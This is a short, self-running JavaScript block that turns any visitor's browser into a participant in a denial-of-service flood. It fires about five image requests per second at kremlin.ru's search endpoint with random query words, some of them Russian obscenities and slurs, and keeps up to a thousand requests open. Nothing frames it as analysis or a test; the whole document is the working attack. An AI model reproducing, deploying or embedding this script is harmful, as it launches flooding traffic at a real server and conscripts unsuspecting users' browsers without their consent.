<script>
(function () {
	var targetURL = "http://kremlin.ru";
	var fireInterval;
	var isFiring = false;
	var requestsHT = {};
	var requestedCtr = 0,
		succeededCtr = 0,
		failedCtr = 0;
	var makeHttpRequest = function () {
			if (requestedCtr > failedCtr + succeededCtr + 1000) {
				return;
			};
			var pg=new Array("asss","beet","cast","door","erro","fogy","gout","hell","jizz","know","lemo","meet","noob","oral","prik","quest","rezo","seek","took","ussr","vlog","week","xbox","ynou","zara","1989","2012","3567","4361","5772","6097","7109","8452","9832",1090,1157,1232,1364,1488,1500,1601,1746,1882,1933,2011,"авто","вера","гугл","демо","ежжи","ёлка","жека","зонт","икра","котэ","лямб","муня","нота","орда","пека","рота","стул","туки","утка","фора","хата","царь","чемп","шара","щелк","ъжах","ыыыы","ьбла","экко","юкки","яззь","бьор","батэ","бязь","бэтмен","беон","боты","бёдр","бытт","бизэ","бута","бюро","вьят","ваза","вяло","вэро","вело","воры","вёрт","выто","вики","вуди","вюрт","галя","гязо","гэрб","герп","голд","гётэ","гыгы","гиза","гуфф","гюго","жако","желе","жопа","жиды","жуки","дьоо","дата","дядя","дэня","дети","дота","дёрт","дыра","диод","дубы","дюйм","зьот","заиц","зяьб","зэим","зеяб","зоты","зёма","зырь","зиза","зубы","зюзя","карта","кянк","кэпп","кекс","кокь","кёко","кышт","киса","куки","кюзо","чьоо","часы","чета","чёта","чика","чурк","льды","лама","лямда","лэти","лето","лото","лё","лызо","лиса","лука","люся","мьон","мако","мясо","мэйл","месь","море","мёдд","мырза","мини","мука","мюсли","ньор","нака","няша","нэкл","нест","нора","нёрд","ныса","ника","нутро","нюня","пьос","пава","пята","пэур","перо","пора","пёсс","пыса","пика","пузо","пюре","рьвы","рамб","рязь","рэмбл","река","рост","рёбра","рыба","рита","рука","рюкзак","сьто","сабо","сякэ","сэмпл","село","соси","сёня","сыры","сиси","супп","сюсм","тьло","таро","тянн","тэно","тека","тото","тётя","тыква","ти","ту","тю","фь","фа","фяся","фэлоу","фека","фора","фёня","фыгы","фики","фута","фюрер","харэ","хэхэ","херб","хохол","хиты","хунд","шары","шерл","шоко","шина","шумы","цапл","цепь","цоой","цыга","цуке","щьот","щасс","щелк","щёки","щиты","щука");
			var rID = Math.floor(Math.random()*pg.length); 
			var img = new Image();
			img.onerror = function () { onFail(rID); };
			img.onabort = function () { onFail(rID); };
			img.onload = function () { onSuccess(rID); };
			img.setAttribute("src", targetURL + "/search?query=" + pg[rID]);
			requestsHT[rID] = img;
			onRequest(rID);
		};
	var onRequest = function (rID) {
			requestedCtr++;
		};
	var onComplete = function (rID) {
			delete requestsHT[rID];
		};
	var onFail = function (rID) {
			failedCtr++;
			delete requestsHT[rID];
		};
	var onSuccess = function (rID) {
			succeededCtr++;
			delete requestsHT[rID];
		};
	fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(5) | 0));
})();
</script>
